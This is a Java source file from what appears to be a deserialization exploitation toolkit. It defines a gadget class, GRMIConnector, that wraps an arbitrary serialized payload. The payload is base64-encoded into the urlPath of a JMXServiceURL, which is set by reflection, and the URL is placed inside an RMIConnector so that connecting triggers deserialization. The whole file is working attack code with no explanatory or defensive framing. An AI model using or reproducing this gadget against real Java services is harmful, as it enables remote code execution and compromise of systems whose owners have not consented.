package xyz.eki.marshalexp.gadget.jdk;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;

/**
 *
 */
public class GRMIConnector {
    public static RMIConnector invokeConnect2Deserialize(byte[] serialBytes) throws Exception{
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        ReflectUtils.setFieldValue(jmxServiceURL, "urlPath", "/stub/"+ MiscUtils.base64Encode(serialBytes));
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        return rmiConnector;
    }

    public static RMIConnector invokeConnect2Deserialize(Object poc) throws Exception{
        return invokeConnect2Deserialize(SerializeUtils.serialize(poc));
    }
}
